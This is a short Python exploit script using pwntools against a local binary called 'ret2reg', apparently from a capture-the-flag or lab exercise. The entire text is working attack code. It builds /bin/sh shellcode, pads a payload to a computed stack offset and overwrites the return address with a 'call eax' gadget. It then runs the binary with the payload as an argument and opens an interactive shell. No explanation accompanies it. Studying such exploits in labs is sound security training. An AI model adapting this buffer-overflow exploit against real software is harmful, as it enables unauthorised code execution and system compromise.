from pwn import *

shellcode = asm(shellcraft.sh())

call_eax = p32(0x0804901d)

offset = 0xffffd0f8-0xffffcef0+4
payload = flat([shellcode , b'a'* (offset - len(shellcode) ),call_eax])

io = process(argv=[ "./ret2reg",payload])

io.interactive()